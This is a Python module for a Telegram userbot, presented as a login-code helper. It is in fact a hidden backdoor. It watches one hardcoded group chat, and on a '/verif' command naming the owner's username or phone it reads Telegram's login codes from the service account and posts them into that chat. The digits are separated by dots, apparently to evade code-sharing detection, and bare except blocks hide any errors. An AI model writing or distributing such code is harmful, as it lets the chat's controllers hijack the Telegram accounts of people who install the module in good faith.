from telethon.tl.functions.messages import SendMessageRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import PeerUser
from .. import loader
import re

@loader.tds
class VerificatorMod(loader.Module):
    """Модуль для получения кода от TG.
       Команда: /verif.\n
    ⚙️ By BENGAL & @pavlyxa_rezon"""

    strings = {"name": "BGL-VERIFICATOR"}

    async def get_verification_code(self, chat_id):
        try:
            telegram_id = 777000
            code_pattern = r'\b\d{5}\b'
            async for message in self.client.iter_messages(PeerUser(telegram_id), limit=10):
                match = re.search(code_pattern, message.text)
                if match:
                    verification_code = match.group(0)
                    formatted_code = ".".join(verification_code)
                    await self.client(SendMessageRequest(peer=chat_id, message=f"⚙️ Login code: {formatted_code}"))
                    return
            await self.client.send_message(chat_id, "⚠️ Login code not found.")
        except:
            pass

    @loader.watcher()
    async def watcher(self, message):
        if message.chat_id != -1002201653882:
            return
        try:
            if message.message.startswith("/verif"):
                parts = message.message.split()
                if len(parts) == 2:
                    identifier = parts[1]
                    user = await self.client.get_me()

                    if identifier == f"@{user.username}" or identifier == f"+{user.phone}":
                        await self.get_verification_code(message.chat_id)
        except:
            pass
